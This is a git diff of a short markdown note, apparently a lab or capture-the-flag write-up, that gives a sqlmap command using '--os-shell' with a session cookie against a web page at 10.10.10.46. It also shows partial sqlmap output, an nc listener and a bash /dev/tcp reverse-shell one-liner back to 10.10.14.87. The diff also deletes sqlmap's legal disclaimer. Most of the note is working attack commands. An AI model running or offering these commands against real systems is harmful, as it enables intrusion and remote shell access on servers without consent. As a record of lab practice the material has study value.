@@ -12,7 +12,6 @@ tags:
   - sqlmap
 ---
 
-
 This is the command string to test if a SQL backed web page is vulnerable to SQL injection:
 
 Needs:
@@ -21,6 +20,7 @@ Needs:
 3. the command extention = '--os-shell'
 
 The Command:
+
 'sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=k3ivqlrh8f7i68p3vis6pmjsal" --os-shell,
 
 ```yaml
@@ -34,7 +34,7 @@ The Command:
 |___|_  [(]_|_|_|__,|  _|                                            
       |_|V...       |_|   http://sqlmap.org                          
 
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
 
 [*] starting @ 20:42:21 /2021-01-01/
 
@@ -60,9 +60,10 @@ uname -a
 whoami
 
 in the example I passes in a net cat shell back to another terminal I had running a nc listener 'nc -nlvp 4321'
+
 'bash -c 'bash -i >& /dev/tcp/10.10.14.87/4321 0>&1'
 
-Note the session was not stable but I was able to keep it open long enough to open another connection not bases on sqli
+Note: the session was not stable but I was able to keep it open long enough to open another connection not bases on sqli
 
 
 [SQLMap Cheat Sheet :][upgrade-term]
